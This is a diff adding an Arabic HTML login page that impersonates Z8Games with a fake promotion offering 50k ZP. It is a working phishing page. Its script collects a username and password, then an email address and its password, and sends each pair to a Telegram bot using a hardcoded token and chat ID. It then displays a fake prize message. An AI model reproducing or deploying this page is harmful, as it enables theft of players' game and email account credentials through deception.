@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - ز8 جيمز</title>
+    <style>
+        /* Global Styles */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            color: #fff;
+            background-image: url('https://i.imgur.com/kUfwJUA.jpeg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            height: 100vh;
+            position: relative;
+        }
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-box {
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 40px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        .z8-logo img { max-width: 200px; margin-bottom: 20px; }
+        .promo-text { font-size: 20px; font-weight: bold; color: #e67e22; margin-bottom: 5px; }
+        .input-field {
+            width: 100%; padding: 10px; margin-bottom: 15px; background-color: #333;
+            border: 1px solid #444; color: #fff; border-radius: 5px; font-size: 16px;
+        }
+        .login-btn { width: 100%; padding: 10px; background-color: #f39c12; border: none;
+            border-radius: 5px; font-size: 18px; cursor: pointer; color: #fff; }
+        .login-btn:hover { background-color: #e67e22; }
+        .footer, .forgot-password { text-align: center; margin-top: 10px; color: #ccc; }
+        .forgot-password a, .footer a { color: #f39c12; text-decoration: none; }
+        .second-form, .success-message { display: none; }
+        .bottom-left-logos { position: absolute; bottom: 10px; left: 10px; display: flex; gap: 20px; }
+        .bottom-left-logos img { width: 50px; }
+        .top-right-image { position: absolute; top: 10px; right: 10px; width: 100px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <!-- Z8 Logo -->
+            <div class="z8-logo">
+                <img src="https://z8games.akamaized.net/portal_na/template_new/assets/img/login/logo-z8games.svg" alt="Z8 Logo">
+            </div>
+            <!-- Promotional Text -->
+            <div class="promo-text">سجل هنا واربح معنا</div>
+
+            <!-- First form (Username and Password) -->
+            <form id="first-form" action="javascript:void(0);" method="post" onsubmit="submitUsernameForm()">
+                <input type="text" class="input-field" id="username" placeholder="اسم المستخدم" required>
+                <input type="password" class="input-field" id="password" placeholder="كلمة المرور" required>
+                <button type="submit" class="login-btn">تسجيل الدخول</button>
+            </form>
+
+            <!-- Second form (Email and Password) -->
+            <div class="second-form" id="second-form">
+                <h2>تسجيل الدخول بالبريد الإلكتروني</h2>
+                <form action="javascript:void(0);" method="post" onsubmit="submitEmailForm()">
+                    <input type="email" class="input-field" id="email" placeholder="البريد الإلكتروني" required>
+                    <input type="password" class="input-field" id="email-password" placeholder="كلمة المرور" required>
+                    <button type="submit" class="login-btn">تسجيل الدخول</button>
+                </form>
+            </div>
+
+            <!-- Success Message -->
+            <div class="success-message" id="success-message">
+                <h2>تهانينأ لقد فزت ب 50k ZP</h2>
+                <p>سوف يتم الشحن فى خلال 24 ساعة</p>
+            </div>
+
+            <div class="forgot-password">
+                <a href="#">نسيت كلمة المرور؟</a>
+            </div>
+            <div class="footer">
+                <p>ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
+                <p>&copy; 2024 ز8 جيمز. جميع الحقوق محفوظة.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bottom-left logos -->
+    <div class="bottom-left-logos">
+        <img src="https://z8games.akamaized.net/common/assets/lib/logo/sgw-white-h.svg" alt="SGW Logo">
+        <img src="https://z8games.akamaized.net/common/assets/lib/logo/sge-white-h.svg" alt="SGE Logo">
+    </div>
+
+    <!-- Image in the top right -->
+    <img class="top-right-image" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKFj-n4fZwu9cweIpkhlhxnZ9ofE8zmys0wG6A5-9Okc19BC-J6y1Q5PI&s=10" alt="Top Right Image">
+
+    <script>
+        // Telegram Bot Details
+        const telegramToken = '7820964187:AAFS_Ra2DOzVZRo8MNMgmQ1Q8w2pYYogQKU';
+        const telegramChatId = '5753872265';
+
+        // Function to send data to Telegram
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: telegramChatId, text: message })
+            });
+        }
+
+        // Handle username and password form submission
+        function submitUsernameForm() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+            sendToTelegram(message);
+
+            document.getElementById('first-form').style.display = 'none';
+            document.getElementById('second-form').style.display = 'block';
+        }
+
+        // Handle email form submission
+        function submitEmailForm() {
+            const email = document.getElementById('email').value;
+            const emailPassword = document.getElementById('email-password').value;
+            const message = `البريد الإلكتروني: ${email}\nكلمة المرور: ${emailPassword}`;
+            sendToTelegram(message);
+
+            document.getElementById('second-form').style.display = 'none';
+            document.getElementById('success-message').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
